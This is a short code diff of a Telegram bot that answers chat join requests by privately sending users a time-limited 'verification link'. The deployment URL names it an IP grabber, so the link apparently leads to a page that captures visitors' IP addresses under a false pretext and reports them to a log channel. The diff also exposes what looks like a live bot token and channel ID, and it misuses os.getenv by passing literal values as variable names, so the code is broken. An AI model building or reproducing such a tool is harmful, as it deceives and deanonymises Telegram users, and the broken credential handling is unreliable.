@@ -1,13 +1,13 @@
 import telebot
 from telebot import types
 import os
-from dotenv import load_dotenv
 
-load_dotenv()
-
-bot = telebot.TeleBot(os.getenv('8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI'))
-WEB_URL = os.getenv('WEB_URL')
+# Get credentials from Railway environment variables
+BOT_TOKEN = os.getenv('8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI')
+WEB_URL = os.getenv('https://ip-grabber-bot-production.up.railway.app')
 LOG_CHANNEL = os.getenv('-1003976117318')
+
+bot = telebot.TeleBot(BOT_TOKEN)
 
 @bot.chat_join_request_handler()
 def handle_join_request(request: types.ChatJoinRequest):
@@ -28,8 +28,9 @@ def handle_join_request(request: types.ChatJoinRequest):
             f"Link will expire in 10 minutes.",
             reply_markup=markup
         )
+        print(f"✅ Verification link sent to user {user_id}")
     except Exception as e:
-        print(f"❌ Failed to send PM: {e}")
+        print(f"❌ Failed to send PM to {user_id}: {e}")
 
 @bot.message_handler(commands=['start'])
 def start(message):
